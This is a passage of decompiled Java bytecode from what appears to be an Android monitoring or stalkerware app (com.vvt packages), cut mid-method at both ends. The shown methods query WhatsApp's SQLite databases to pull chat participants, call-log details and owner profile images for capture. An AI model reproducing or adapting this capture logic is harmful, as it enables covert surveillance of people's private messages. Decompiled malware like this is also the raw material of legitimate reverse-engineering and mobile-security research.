    //   114: istore 15
    //   116: ldc_w 399
    //   119: astore 16
    //   121: aload 4
    //   123: aload 16
    //   125: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   128: istore 17
    //   130: ldc_w 401
    //   133: astore 18
    //   135: aload 4
    //   137: aload 18
    //   139: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   142: istore 19
    //   144: iload 10
    //   146: iload 5
    //   148: if_icmple +28 -> 176
    //   151: iload 10
    //   153: bipush 17
    //   155: iadd
    //   156: istore 10
    //   158: aload 4
    //   160: iload 10
    //   162: iload 19
    //   164: invokevirtual 405	java/lang/String:substring	(II)Ljava/lang/String;
    //   167: astore 11
    //   169: aload 7
    //   171: aload 11
    //   173: invokevirtual 406	com/vvt/im/events/info/d:a	(Ljava/lang/String;)V
    //   176: iload 13
    //   178: iload 5
    //   180: if_icmple +98 -> 278
    //   183: iload 13
    //   185: bipush 24
    //   187: iadd
    //   188: istore 10
    //   190: aload 4
    //   192: iload 10
    //   194: iload 19
    //   196: invokevirtual 405	java/lang/String:substring	(II)Ljava/lang/String;
    //   199: astore 11
    //   201: aload 11
    //   203: ifnull +75 -> 278
    //   206: ldc 70
    //   208: astore 12
    //   210: aload 11
    //   212: aload 12
    //   214: invokevirtual 409	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   217: istore 13
    //   219: iload 13
    //   221: ifne +57 -> 278
    //   224: aload 7
    //   226: aload 11
    //   228: invokevirtual 410	com/vvt/im/events/info/d:d	(Ljava/lang/String;)V
    //   231: new 63	java/lang/StringBuilder
    //   234: astore 12
    //   236: aload 12
    //   238: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   241: aload 12
    //   243: aload 11
    //   245: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   248: astore 11
    //   250: ldc_w 412
    //   253: astore 12
    //   255: aload 11
    //   257: aload 12
    //   259: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   262: astore 11
    //   264: aload 11
    //   266: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   269: astore 11
    //   271: aload 7
    //   273: aload 11
    //   275: invokevirtual 413	com/vvt/im/events/info/d:removeFromPath	(Ljava/lang/String;)V
    //   278: iload 15
    //   280: iload 5
    //   282: if_icmple -220 -> 62
    //   285: aload 7
    //   287: invokevirtual 415	com/vvt/im/events/info/d:removeFromPath	()Ljava/lang/String;
    //   290: astore 11
    //   292: aload 11
    //   294: ifnull +28 -> 322
    //   297: aload 7
    //   299: invokevirtual 415	com/vvt/im/events/info/d:removeFromPath	()Ljava/lang/String;
    //   302: astore 11
    //   304: ldc 70
    //   306: astore 12
    //   308: aload 11
    //   310: aload 12
    //   312: invokevirtual 409	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   315: istore 10
    //   317: iload 10
    //   319: ifeq -257 -> 62
    //   322: iload 17
    //   324: bipush 10
    //   326: iadd
    //   327: istore 10
    //   329: aload 4
    //   331: iload 10
    //   333: iload 19
    //   335: invokevirtual 405	java/lang/String:substring	(II)Ljava/lang/String;
    //   338: astore 11
    //   340: iload 15
    //   342: bipush 10
    //   344: iadd
    //   345: istore 13
    //   347: aload 4
    //   349: iload 13
    //   351: iload 19
    //   353: invokevirtual 405	java/lang/String:substring	(II)Ljava/lang/String;
    //   356: astore 4
    //   358: new 63	java/lang/StringBuilder
    //   361: astore 12
    //   363: aload 12
    //   365: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   368: aload 12
    //   370: aload 11
    //   372: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   375: astore 12
    //   377: aload 12
    //   379: aload 4
    //   381: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   384: astore 12
    //   386: aload 12
    //   388: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   391: astore 12
    //   393: aload 7
    //   395: aload 12
    //   397: invokevirtual 410	com/vvt/im/events/info/d:d	(Ljava/lang/String;)V
    //   400: new 63	java/lang/StringBuilder
    //   403: astore 12
    //   405: aload 12
    //   407: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   410: aload 12
    //   412: aload 11
    //   414: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   417: astore 11
    //   419: aload 11
    //   421: aload 4
    //   423: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   426: astore 4
    //   428: ldc_w 412
    //   431: astore 11
    //   433: aload 4
    //   435: aload 11
    //   437: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   440: astore 4
    //   442: aload 4
    //   444: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   447: astore 4
    //   449: aload 7
    //   451: aload 4
    //   453: invokevirtual 413	com/vvt/im/events/info/d:removeFromPath	(Ljava/lang/String;)V
    //   456: goto -394 -> 62
    //   459: astore 4
    //   461: aload 9
    //   463: astore 4
    //   465: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   468: istore 20
    //   470: iload 20
    //   472: ifeq +3 -> 475
    //   475: aload 4
    //   477: ifnull +8 -> 485
    //   480: aload 4
    //   482: invokevirtual 416	java/io/FileReader:close	()V
    //   485: aload 8
    //   487: invokestatic 419	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   490: aload_2
    //   491: invokestatic 422	com/vvt/capture/wa/removeFromPath/a:a	(Ljava/lang/String;)[B
    //   494: astore 8
    //   496: aload 8
    //   498: ifnull +57 -> 555
    //   501: aload 8
    //   503: arraylength
    //   504: istore_3
    //   505: iload_3
    //   506: ifle +49 -> 555
    //   509: getstatic 205	com/vvt/im/events/ImType:WHATSAPP	Lcom/vvt/im/events/ImType;
    //   512: astore 4
    //   514: getstatic 425	com/vvt/im/events/ImMediaFileType:OWNER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   517: astore 9
    //   519: aload_0
    //   520: aload 4
    //   522: aload 9
    //   524: invokestatic 216	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/ImType;Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   527: astore 4
    //   529: getstatic 425	com/vvt/im/events/ImMediaFileType:OWNER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   532: invokestatic 219	com/vvt/im/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   535: astore 9
    //   537: aload 8
    //   539: aload 4
    //   541: aload 9
    //   543: invokestatic 428	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   546: astore 8
    //   548: aload 7
    //   550: aload 8
    //   552: invokevirtual 430	com/vvt/im/events/info/d:f	(Ljava/lang/String;)V
    //   555: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   558: istore 6
    //   560: iload 6
    //   562: ifeq +3 -> 565
    //   565: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   568: istore 6
    //   570: iload 6
    //   572: ifeq +3 -> 575
    //   575: aload 7
    //   577: areturn
    //   578: astore 8
    //   580: iconst_0
    //   581: istore 20
    //   583: aconst_null
    //   584: astore 9
    //   586: aload 9
    //   588: ifnull +8 -> 596
    //   591: aload 9
    //   593: invokevirtual 416	java/io/FileReader:close	()V
    //   596: aload 4
    //   598: invokestatic 419	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   601: aload 8
    //   603: athrow
    //   604: astore 9
    //   606: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   609: istore 20
    //   611: iload 20
    //   613: ifeq -17 -> 596
    //   616: goto -20 -> 596
    //   619: astore 4
    //   621: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   624: istore_3
    //   625: iload_3
    //   626: ifeq -141 -> 485
    //   629: goto -144 -> 485
    //   632: aload 9
    //   634: ifnull -149 -> 485
    //   637: aload 9
    //   639: invokevirtual 416	java/io/FileReader:close	()V
    //   642: goto -157 -> 485
    //   645: astore 4
    //   647: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   650: istore_3
    //   651: iload_3
    //   652: ifeq -167 -> 485
    //   655: goto -170 -> 485
    //   658: astore 8
    //   660: goto -74 -> 586
    //   663: astore 21
    //   665: aload 8
    //   667: astore 4
    //   669: aload 21
    //   671: astore 8
    //   673: goto -87 -> 586
    //   676: astore 21
    //   678: aload 4
    //   680: astore 9
    //   682: aload 8
    //   684: astore 4
    //   686: aload 21
    //   688: astore 8
    //   690: goto -104 -> 586
    //   693: astore 8
    //   695: iconst_0
    //   696: istore 6
    //   698: aconst_null
    //   699: astore 8
    //   701: goto -236 -> 465
    //   704: astore 8
    //   706: iconst_0
    //   707: istore 6
    //   709: aconst_null
    //   710: astore 8
    //   712: aload 9
    //   714: astore 4
    //   716: goto -251 -> 465
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	719	0	paramString1	String
    //   0	719	1	paramString2	String
    //   0	719	2	paramString3	String
    //   1	505	3	i	int
    //   624	28	3	bool1	boolean
    //   3	449	4	localObject1	Object
    //   459	1	4	localException1	Exception
    //   463	134	4	localObject2	Object
    //   619	1	4	localIOException1	java.io.IOException
    //   645	1	4	localIOException2	java.io.IOException
    //   667	48	4	localObject3	Object
    //   6	277	5	j	int
    //   11	697	6	bool2	boolean
    //   21	555	7	locald	com.vvt.im.events.info.d
    //   30	521	8	localObject4	Object
    //   578	24	8	localObject5	Object
    //   658	8	8	localObject6	Object
    //   671	18	8	localObject7	Object
    //   693	1	8	localException2	Exception
    //   699	1	8	localObject8	Object
    //   704	1	8	localException3	Exception
    //   710	1	8	localObject9	Object
    //   35	557	9	localObject10	Object
    //   604	34	9	localIOException3	java.io.IOException
    //   680	33	9	localObject11	Object
    //   51	142	10	k	int
    //   315	3	10	bool3	boolean
    //   327	5	10	m	int
    //   77	359	11	localObject12	Object
    //   91	320	12	localObject13	Object
    //   100	88	13	n	int
    //   217	3	13	bool4	boolean
    //   345	5	13	i1	int
    //   105	5	14	str1	String
    //   114	231	15	i2	int
    //   119	5	16	str2	String
    //   128	199	17	i3	int
    //   133	5	18	str3	String
    //   142	210	19	i4	int
    //   468	144	20	bool5	boolean
    //   663	7	21	localObject14	Object
    //   676	11	21	localObject15	Object
    // Exception table:
    //   from	to	target	type
    //   62	67	459	java/lang/Exception
    //   81	86	459	java/lang/Exception
    //   95	100	459	java/lang/Exception
    //   109	114	459	java/lang/Exception
    //   123	128	459	java/lang/Exception
    //   137	142	459	java/lang/Exception
    //   162	167	459	java/lang/Exception
    //   171	176	459	java/lang/Exception
    //   194	199	459	java/lang/Exception
    //   212	217	459	java/lang/Exception
    //   226	231	459	java/lang/Exception
    //   231	234	459	java/lang/Exception
    //   236	241	459	java/lang/Exception
    //   243	248	459	java/lang/Exception
    //   257	262	459	java/lang/Exception
    //   264	269	459	java/lang/Exception
    //   273	278	459	java/lang/Exception
    //   285	290	459	java/lang/Exception
    //   297	302	459	java/lang/Exception
    //   310	315	459	java/lang/Exception
    //   333	338	459	java/lang/Exception
    //   351	356	459	java/lang/Exception
    //   358	361	459	java/lang/Exception
    //   363	368	459	java/lang/Exception
    //   370	375	459	java/lang/Exception
    //   379	384	459	java/lang/Exception
    //   386	391	459	java/lang/Exception
    //   395	400	459	java/lang/Exception
    //   400	403	459	java/lang/Exception
    //   405	410	459	java/lang/Exception
    //   412	417	459	java/lang/Exception
    //   421	426	459	java/lang/Exception
    //   435	440	459	java/lang/Exception
    //   442	447	459	java/lang/Exception
    //   451	456	459	java/lang/Exception
    //   32	35	578	finally
    //   39	43	578	finally
    //   591	596	604	java/io/IOException
    //   480	485	619	java/io/IOException
    //   637	642	645	java/io/IOException
    //   43	46	658	finally
    //   57	62	658	finally
    //   62	67	663	finally
    //   81	86	663	finally
    //   95	100	663	finally
    //   109	114	663	finally
    //   123	128	663	finally
    //   137	142	663	finally
    //   162	167	663	finally
    //   171	176	663	finally
    //   194	199	663	finally
    //   212	217	663	finally
    //   226	231	663	finally
    //   231	234	663	finally
    //   236	241	663	finally
    //   243	248	663	finally
    //   257	262	663	finally
    //   264	269	663	finally
    //   273	278	663	finally
    //   285	290	663	finally
    //   297	302	663	finally
    //   310	315	663	finally
    //   333	338	663	finally
    //   351	356	663	finally
    //   358	361	663	finally
    //   363	368	663	finally
    //   370	375	663	finally
    //   379	384	663	finally
    //   386	391	663	finally
    //   395	400	663	finally
    //   400	403	663	finally
    //   405	410	663	finally
    //   412	417	663	finally
    //   421	426	663	finally
    //   435	440	663	finally
    //   442	447	663	finally
    //   451	456	663	finally
    //   465	468	676	finally
    //   32	35	693	java/lang/Exception
    //   39	43	693	java/lang/Exception
    //   43	46	704	java/lang/Exception
    //   57	62	704	java/lang/Exception
  }
  
  private static f a(SQLiteDatabase paramSQLiteDatabase, String paramString1, Cursor paramCursor, ICallLogData.Direction paramDirection, String paramString2, com.vvt.im.events.info.d paramd, boolean paramBoolean)
  {
    f localf = new com/vvt/im/events/info/f;
    localf.<init>();
    Object localObject;
    String str1;
    String str2;
    String str3;
    if (paramString2 != null)
    {
      localObject = "@FxFileObserverWorker.us";
      boolean bool = paramString2.endsWith((String)localObject);
      if (!bool) {
        break label173;
      }
      int i = paramCursor.getColumnIndex("remote_resource");
      str1 = paramCursor.getString(i);
      localObject = ICallLogData.Direction.IN;
      if (paramDirection != localObject) {
        break label142;
      }
      localObject = a(paramSQLiteDatabase, str1, paramBoolean);
      str2 = com.vvt.capture.wa.b.a.a((com.vvt.capture.wa.a.d)localObject, str1);
      str3 = com.vvt.capture.wa.b.a.b(str1);
      localObject = ((com.vvt.capture.wa.a.d)localObject).a();
    }
    for (;;)
    {
      localf.d(str3);
      localf.b(str2);
      localf.a(null);
      localf.e(null);
      localf.c((String)localObject);
      localf.a(str1);
      return localf;
      label142:
      str1 = paramd.b();
      str3 = paramd.e();
      str2 = paramd.a();
      localObject = paramd.d();
      continue;
      label173:
      localObject = ICallLogData.Direction.IN;
      if (paramDirection == localObject)
      {
        localObject = a(paramSQLiteDatabase, paramString2, paramBoolean);
        str2 = com.vvt.capture.wa.b.a.a((com.vvt.capture.wa.a.d)localObject, paramString2);
        str3 = com.vvt.capture.wa.b.a.b(paramString2);
        localObject = ((com.vvt.capture.wa.a.d)localObject).a();
        str1 = paramString2;
      }
      else
      {
        str1 = paramd.b();
        str3 = paramd.e();
        str2 = paramd.a();
        localObject = paramd.d();
      }
    }
  }
  
  /* Error */
  private static String a(int paramInt, String paramString)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: iload_2
    //   5: anewarray 4	java/lang/Object
    //   8: astore 4
    //   10: aload 4
    //   12: iconst_0
    //   13: ldc 118
    //   15: aastore
    //   16: ldc 53
    //   18: aload 4
    //   20: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   23: astore 5
    //   25: iload_2
    //   26: anewarray 57	java/lang/String
    //   29: astore 6
    //   31: new 63	java/lang/StringBuilder
    //   34: astore 7
    //   36: aload 7
    //   38: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   41: aload 7
    //   43: iload_0
    //   44: invokevirtual 180	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   47: ldc 70
    //   49: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   52: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   55: astore 7
    //   57: aload 6
    //   59: iconst_0
    //   60: aload 7
    //   62: aastore
    //   63: iload_2
    //   64: anewarray 4	java/lang/Object
    //   67: astore 4
    //   69: ldc 118
    //   71: astore 8
    //   73: aload 4
    //   75: iconst_0
    //   76: aload 8
    //   78: aastore
    //   79: ldc 76
    //   81: aload 4
    //   83: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   86: astore 9
    //   88: ldc 25
    //   90: astore 7
    //   92: ldc 27
    //   94: astore 4
    //   96: aload 7
    //   98: aload 4
    //   100: invokestatic 464	com/vvt/p/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   103: astore 7
    //   105: aload 7
    //   107: ifnull +266 -> 373
    //   110: ldc -74
    //   112: astore 4
    //   114: iconst_0
    //   115: istore 10
    //   117: aconst_null
    //   118: astore 8
    //   120: iconst_0
    //   121: istore_2
    //   122: aload 7
    //   124: aload 4
    //   126: aconst_null
    //   127: aload 5
    //   129: aload 6
    //   131: aconst_null
    //   132: aconst_null
    //   133: aload 9
    //   135: invokevirtual 84	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   138: astore 4
    //   140: aload 4
    //   142: ifnull +218 -> 360
    //   145: aload 4
    //   147: invokeinterface 185 1 0
    //   152: istore 10
    //   154: iload 10
    //   156: ifeq +204 -> 360
    //   159: aload 4
    //   161: aload_1
    //   162: invokeinterface 96 2 0
    //   167: istore 10
    //   169: aload 4
    //   171: iload 10
    //   173: invokeinterface 100 2 0
    //   178: astore_3
    //   179: aload 4
    //   181: astore 11
    //   183: aload_3
    //   184: astore 4
    //   186: aload 11
    //   188: astore_3
    //   189: aload_3
    //   190: ifnull +9 -> 199
    //   193: aload_3
    //   194: invokeinterface 116 1 0
    //   199: aload 7
    //   201: ifnull +8 -> 209
    //   204: aload 7
    //   206: invokevirtual 41	android/database/sqlite/SQLiteDatabase:close	()V
    //   209: aload 4
    //   211: astore 7
    //   213: aload 7
    //   215: areturn
    //   216: astore 7
    //   218: aconst_null
    //   219: astore 7
    //   221: aconst_null
    //   222: astore 4
    //   224: getstatic 23	com/vvt/capture/wa/full/a:MyUncaughtExceptionHandler	Z
    //   227: istore 10
    //   229: iload 10
    //   231: ifeq +3 -> 234
    //   234: aload 7
    //   236: ifnull +10 -> 246
    //   239: aload 7
    //   241: invokeinterface 116 1 0
    //   246: aload 4
    //   248: ifnull +8 -> 256
    //   251: aload 4
    //   253: invokevirtual 41	android/database/sqlite/SQLiteDatabase:close	()V
    //   256: aconst_null
    //   257: astore 7
    //   259: goto -46 -> 213
    //   262: astore 7
    //   264: aconst_null
    //   265: astore 4
    //   267: aload_3
    //   268: ifnull +9 -> 277
    //   271: aload_3
    //   272: invokeinterface 116 1 0
    //   277: aload 4
    //   279: ifnull +8 -> 287
    //   282: aload 4
    //   284: invokevirtual 41	android/database/sqlite/SQLiteDatabase:close	()V
    //   287: aload 7
    //   289: athrow
    //   290: astore 11
    //   292: aload 7
    //   294: astore 4
    //   296: aload 11
    //   298: astore 7
    //   300: goto -33 -> 267
    //   303: astore 8
    //   305: aload 4
    //   307: astore_3
    //   308: aload 7
    //   310: astore 4
    //   312: aload 8
    //   314: astore 7
    //   316: goto -49 -> 267
    //   319: astore 8
    //   321: aload 7
    //   323: astore_3
    //   324: aload 8
    //   326: astore 7
    //   328: goto -61 -> 267
    //   331: astore 4
    //   333: aload 7
    //   335: astore 4
    //   337: aconst_null
    //   338: astore 7
    //   340: goto -116 -> 224
    //   343: astore 8
    //   345: aload 4
    //   347: astore 11
    //   349: aload 7
    //   351: astore 4
    //   353: aload 11
    //   355: astore 7
    //   357: goto -133 -> 224
    //   360: aload 4
    //   362: astore 11
    //   364: aconst_null
    //   365: astore 4
    //   367: aload 11
    //   369: astore_3
    //   370: goto -181 -> 189
    //   373: aconst_null
    //   374: astore 4
    //   376: goto -187 -> 189
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	379	0	paramInt	int
    //   0	379	1	paramString	String
    //   1	121	2	i	int
    //   3	367	3	localObject1	Object
    //   8	303	4	localObject2	Object
    //   331	1	4	localException1	Exception
    //   335	40	4	localObject3	Object
    //   23	105	5	str1	String
    //   29	101	6	arrayOfString	String[]
    //   34	180	7	localObject4	Object
    //   216	1	7	localException2	Exception
    //   219	39	7	localObject5	Object
    //   262	31	7	localObject6	Object
    //   298	58	7	localObject7	Object
    //   71	48	8	str2	String
    //   303	10	8	localObject8	Object
    //   319	6	8	localObject9	Object
    //   343	1	8	localException3	Exception
    //   86	48	9	str3	String
    //   115	40	10	bool1	boolean
    //   167	5	10	j	int
    //   227	3	10	bool2	boolean
    //   181	6	11	localObject10	Object
    //   290	7	11	localObject11	Object
    //   347	21	11	localObject12	Object
    // Exception table:
    //   from	to	target	type
    //   98	103	216	java/lang/Exception
    //   98	103	262	finally
    //   133	138	290	finally
    //   145	152	303	finally
    //   161	167	303	finally
    //   171	178	303	finally
    //   224	227	319	finally
    //   133	138	331	java/lang/Exception
    //   145	152	343	java/lang/Exception
    //   161	167	343	java/lang/Exception
    //   171	178	343	java/lang/Exception
  }
  
  private static String a(int paramInt1, String paramString, long paramLong, int paramInt2)
  {
    String str = null;
    int i = 0;
    while ((str == null) && (i < paramInt2))
    {
      str = a(paramInt1, paramString);
      SystemClock.sleep(paramLong);
      boolean bool = a;
      if (bool) {}
      i += 1;
    }
    return str;
  }
  
  /* Error */
  private static String a(SQLiteDatabase paramSQLiteDatabase, int paramInt, String paramString1, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: ldc_w 475
    //   9: astore 6
    //   11: iconst_1
    //   12: anewarray 4	java/lang/Object
    //   15: astore 7
    //   17: aload 7
    //   19: iconst_0
    //   20: ldc 118
    //   22: aastore
    //   23: ldc 53
    //   25: aload 7
    //   27: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   30: astore 8
    //   32: iconst_1
    //   33: anewarray 57	java/lang/String
    //   36: astore 9
    //   38: new 63	java/lang/StringBuilder
    //   41: astore 7
    //   43: aload 7
    //   45: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   48: aload 7
    //   50: iload_1
    //   51: invokevirtual 180	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   54: ldc 70
    //   56: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   59: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   62: astore 7
    //   64: aload 9
    //   66: iconst_0
    //   67: aload 7
    //   69: aastore
    //   70: iconst_1
    //   71: istore 10
    //   73: iload 10
    //   75: anewarray 4	java/lang/Object
    //   78: astore 7
    //   80: iconst_0
    //   81: istore 11
    //   83: aconst_null
    //   84: astore 12
    //   86: ldc 118
    //   88: astore 13
    //   90: aload 7
    //   92: iconst_0
    //   93: aload 13
    //   95: aastore
    //   96: ldc 76
    //   98: aload 7
    //   100: invokestatic 61	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   103: astore 14
    //   105: iconst_0
    //   106: istore 15
    //   108: aconst_null
    //   109: astore 16
    //   111: iconst_0
    //   112: istore 17
    //   114: bipush 6
    //   116: istore 15
    //   118: iload 17
    //   120: iload 15
    //   122: if_icmpge +304 -> 426
    //   125: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   128: istore 15
    //   130: iload 15
    //   132: ifeq +3 -> 135
    //   135: ldc2_w 296
    //   138: lstore 18
    //   140: lload 18
    //   142: invokestatic 473	android/os/SystemClock:sleep	(J)V
    //   145: ldc -74
    //   147: astore 7
    //   149: iconst_0
    //   150: istore 11
    //   152: aconst_null
    //   153: astore 12
    //   155: iconst_0
    //   156: istore 20
    //   158: aconst_null
    //   159: astore 13
    //   161: iconst_0
    //   162: istore 21
    //   164: aload_0
    //   165: astore 16
    //   167: aload_0
    //   168: aload 7
    //   170: aconst_null
    //   171: aload 8
    //   173: aload 9
    //   175: aconst_null
    //   176: aconst_null
    //   177: aload 14
    //   179: invokevirtual 84	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   182: astore 16
    //   184: aload 16
    //   186: ifnull +333 -> 519
    //   189: aload 16
    //   191: invokeinterface 185 1 0
    //   196: istore 10
    //   198: iload 10
    //   200: ifeq +319 -> 519
    //   203: ldc_w 477
    //   206: astore 7
    //   208: aload 16
    //   210: aload 7
    //   212: invokeinterface 96 2 0
    //   217: istore 10
    //   219: aload 16
    //   221: iload 10
    //   223: invokeinterface 481 2 0
    //   228: astore 7
    //   230: aload 7
    //   232: ifnull +207 -> 439
    //   235: new 57	java/lang/String
    //   238: astore 12
    //   240: aload 12
    //   242: aload 7
    //   244: invokespecial 483	java/lang/String:<init>	([B)V
    //   247: aload 12
    //   249: ifnull +190 -> 439
    //   252: ldc_w 485
    //   255: astore 7
    //   257: aload 12
    //   259: aload 7
    //   261: invokevirtual 354	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   264: istore 10
    //   266: iload 10
    //   268: ifeq +171 -> 439
    //   271: ldc_w 485
    //   274: astore 7
    //   276: aload 12
    //   278: aload 7
    //   280: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   283: istore 10
    //   285: aload 12
    //   287: aload 6
    //   289: invokevirtual 393	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   292: istore 20
    //   294: aload 6
    //   296: invokevirtual 341	java/lang/String:length	()I
    //   299: istore 21
    //   301: iload 20
    //   303: iload 21
    //   305: iadd
    //   306: istore 20
    //   308: aload 12
    //   310: iload 10
    //   312: iload 20
    //   314: invokevirtual 405	java/lang/String:substring	(II)Ljava/lang/String;
    //   317: astore 7
    //   319: ldc_w 487
    //   322: astore 12
    //   324: aload 12
    //   326: aload 7
    //   328: invokestatic 268	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   331: astore 7
    //   333: aload 7
    //   335: invokestatic 131	com/vvt/io/d:AppEngine1	(Ljava/lang/String;)Ljava/lang/String;
    //   338: astore 7
    //   340: new 63	java/lang/StringBuilder
    //   343: astore 12
    //   345: aload 12
    //   347: invokespecial 64	java/lang/StringBuilder:<init>	()V
    //   350: aload 12
    //   352: aload_2
    //   353: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   356: astore 12
    //   358: getstatic 222	java/io/File:separator	Ljava/lang/String;
    //   361: astore 13
    //   363: aload 12
    //   365: aload 13
    //   367: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   370: astore 12
    //   372: aload 12
    //   374: aload_3
    //   375: invokevirtual 68	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   378: astore 12
    //   380: aload 12
    //   382: invokevirtual 74	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   385: astore 5
    //   387: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   390: istore 11
    //   392: iload 11
    //   394: ifeq +3 -> 397
    //   397: aload 7
    //   399: aload 5
    //   401: invokestatic 271	com/vvt/io/d:a	(Ljava/lang/String;Ljava/lang/String;)V
    //   404: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   407: istore 10
    //   409: iload 10
    //   411: ifeq +3 -> 414
    //   414: aload 16
    //   416: ifnull +10 -> 426
    //   419: aload 16
    //   421: invokeinterface 116 1 0
    //   426: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   429: istore 15
    //   431: iload 15
    //   433: ifeq +3 -> 436
    //   436: aload 5
    //   438: areturn
    //   439: iconst_5
    //   440: istore 10
    //   442: iload 17
    //   444: iload 10
    //   446: if_icmpne +73 -> 519
    //   449: aconst_null
    //   450: invokestatic 171	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   453: istore 10
    //   455: iload 10
    //   457: ifeq +62 -> 519
    //   460: ldc_w 490
    //   463: astore 7
    //   465: aload 16
    //   467: aload 7
    //   469: invokeinterface 96 2 0
    //   474: istore 10
    //   476: aload 16
    //   478: iload 10
    //   480: invokeinterface 481 2 0
    //   485: astore 7
    //   487: aload 7
    //   489: ifnull +30 -> 519
    //   492: aload 7
    //   494: aload_2
    //   495: aload_3
    //   496: invokestatic 428	com/vvt/io/d:a	([BLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   499: astore 5
    //   501: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   504: istore 10
    //   506: iload 10
    //   508: ifeq +3 -> 511
    //   511: aload 16
    //   513: ifnull -87 -> 426
    //   516: goto -97 -> 419
    //   519: getstatic 15	com/vvt/capture/wa/full/a:a	Z
    //   522: istore 10
    //   524: iload 10
    //   526: ifeq +3 -> 529
    //   529: aload 16
    //   531: ifnull +10 -> 541
    //   534: aload 16
    //   536: invokeinterface 116 1 0
    //   541: aload 16
    //   543: astore 7
    //   545: iconst_0
    //   546: istore 15
    //   548: aconst_null
    //   549: astore 16
    //   551: iload 17
    //   553: iconst_1
    //   554: iadd
    //   555: istore 11
    //   557: iload 11
    //   559: istore 17
    //   561: aconst_null
    //   562: astore 5
    //   564: aload 7
    //   566: astore 4
    //   568: goto -454 -> 114
    //   571: astore 7
    //   573: aload 16
    //   575: astore 7
